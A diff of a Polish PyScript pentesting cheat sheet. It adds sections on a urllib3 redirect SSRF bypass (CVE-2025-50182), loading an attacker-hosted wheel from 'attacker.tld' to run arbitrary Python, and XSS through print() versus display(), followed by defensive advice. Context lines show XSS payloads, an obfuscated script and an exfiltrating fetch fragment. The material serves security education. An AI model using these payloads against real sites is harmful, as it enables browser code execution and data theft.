@@ -4,9 +4,9 @@
 
 ## Przewodnik po Pentestingu PyScript
 
-PyScript to nowy framework opracowany do integracji Pythona z HTML, dzięki czemu może być używany obok HTML. W tym arkuszu skrótów znajdziesz, jak używać PyScript do swoich celów związanych z testowaniem penetracyjnym.
+PyScript to nowy framework opracowany do integracji Pythona z HTML, dzięki czemu może być używany obok HTML. W tym arkuszu skrótów znajdziesz, jak używać PyScript do celów testowania penetracyjnego.
 
-### Zrzucanie / pobieranie plików z wirtualnego systemu plików pamięci Emscripten:
+### Zrzucanie / Pobieranie plików z wirtualnego systemu plików pamięci Emscripten:
 
 `CVE ID: CVE-2022-30286`\
 \
@@ -47,7 +47,7 @@ body: JSON.stringify({ content: btoa(console.logs) }),
 ```
 ![](https://user-images.githubusercontent.com/66295316/166848198-49f71ccb-73cf-476b-b8f3-139e6371c432.png)
 
-### Cross Site Scripting (Zwykły)
+### Cross Site Scripting (Zwykłe)
 
 Kod:
 ```python
@@ -78,7 +78,7 @@ print(pic+pa+" "+so+e+q+" "+y+m+z+sur+fur+rt+s+p)
 Kod:
 ```html
 <py-script>
-prinht("
+prinht(""
 <script>
 var _0x3675bf = _0x5cf5
 function _0x5cf5(_0xced4e9, _0x1ae724) {
@@ -140,7 +140,7 @@ return _0x34a15f
 return _0x599c()
 }
 </script>
-")
+"")
 </py-script>
 ```
 ![](https://user-images.githubusercontent.com/66295316/166848442-2aece7aa-47b5-4ee7-8d1d-0bf981ba57b8.png)
@@ -155,5 +155,63 @@ print("&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&
 </py-script>
 ```
 ![](https://user-images.githubusercontent.com/66295316/166848534-3e76b233-a95d-4cab-bb2c-42dbd764fefa.png)
+
+---
+
+## Nowe luki i techniki (2023-2025)
+
+### Server-Side Request Forgery poprzez niekontrolowane przekierowania (CVE-2025-50182)
+
+`urllib3 < 2.5.0` ignoruje parametry `redirect` i `retries`, gdy jest wykonywane **w czasie wykonywania Pyodide**, który jest dostarczany z PyScript. Gdy atakujący może wpływać na docelowe adresy URL, może zmusić kod Pythona do podążania za przekierowaniami międzydomenowymi, nawet gdy deweloper wyraźnie je wyłączył ‑ skutecznie omijając logikę anty-SSRF.
+```html
+<script type="py">
+import urllib3
+http = urllib3.PoolManager(retries=False, redirect=False)  # supposed to block redirects
+r = http.request("GET", "https://evil.example/302")      # will STILL follow the 302
+print(r.status, r.url)
+</script>
+```
+Załatane w `urllib3 2.5.0` – zaktualizuj pakiet w swoim obrazie PyScript lub przypisz bezpieczną wersję w `packages = ["urllib3>=2.5.0"]`. Zobacz oficjalny wpis CVE dla szczegółów.
+
+### Ładowanie dowolnych pakietów i ataki na łańcuch dostaw
+
+Ponieważ PyScript pozwala na dowolne adresy URL w liście `packages`, złośliwy aktor, który może modyfikować lub wstrzykiwać konfigurację, może wykonać **całkowicie dowolny kod Python** w przeglądarce ofiary:
+```html
+<py-config>
+packages = ["https://attacker.tld/payload-0.0.1-py3-none-any.whl"]
+</py-config>
+<script type="py">
+import payload  # executes attacker-controlled code during installation
+</script>
+```
+*Wymagane są tylko czyste koła Pythona – nie jest potrzebny krok kompilacji WebAssembly.* Upewnij się, że konfiguracja nie jest kontrolowana przez użytkownika i hostuj zaufane koła na swojej własnej domenie z HTTPS i haszami SRI.
+
+### Zmiany w sanitizacji wyjścia (2023+)
+
+* `print()` nadal wstrzykuje surowy HTML i jest zatem podatny na XSS (przykłady powyżej).
+* Nowszy pomocnik `display()` **domyślnie ucieka HTML** – surowy znacznik musi być owinięty w `pyscript.HTML()`.
+```python
+from pyscript import display, HTML
+
+display("<b>escaped</b>")          # renders literally
+
+display(HTML("<b>not-escaped</b>")) # executes as HTML -> potential XSS if untrusted
+```
+To zachowanie zostało wprowadzone w 2023 roku i jest udokumentowane w oficjalnym przewodniku po wbudowanych funkcjach. Polegaj na `display()` dla nieufnych danych wejściowych i unikaj bezpośredniego wywoływania `print()`.
+
+---
+
+## Najlepsze praktyki defensywne
+
+* **Utrzymuj pakiety w aktualności** – zaktualizuj do `urllib3 >= 2.5.0` i regularnie odbudowuj koła dostarczane z witryną.
+* **Ogranicz źródła pakietów** – odwołuj się tylko do nazw PyPI lub URL-i z tej samej domeny, najlepiej chronionych przez Sub-resource Integrity (SRI).
+* **Wzmocnij politykę bezpieczeństwa treści** – zabroń inline JavaScript (`script-src 'self' 'sha256-…'`), aby wstrzyknięte bloki `<script>` nie mogły być wykonywane.
+* **Zabroń dostarczanych przez użytkownika tagów `<py-script>` / `<script type="py">`** – oczyść HTML na serwerze przed zwróceniem go innym użytkownikom.
+* **Izoluj pracowników** – jeśli nie potrzebujesz synchronicznego dostępu do DOM z pracowników, włącz flagę `sync_main_only`, aby uniknąć wymagań nagłówka `SharedArrayBuffer`.
+
+## Odniesienia
+
+* [NVD – CVE-2025-50182](https://nvd.nist.gov/vuln/detail/CVE-2025-50182)
+* [Dokumentacja Built-ins PyScript – `display` & `HTML`](https://docs.pyscript.net/2024.6.1/user-guide/builtins/)
 
 {{#include ../../banners/hacktricks-training.md}}
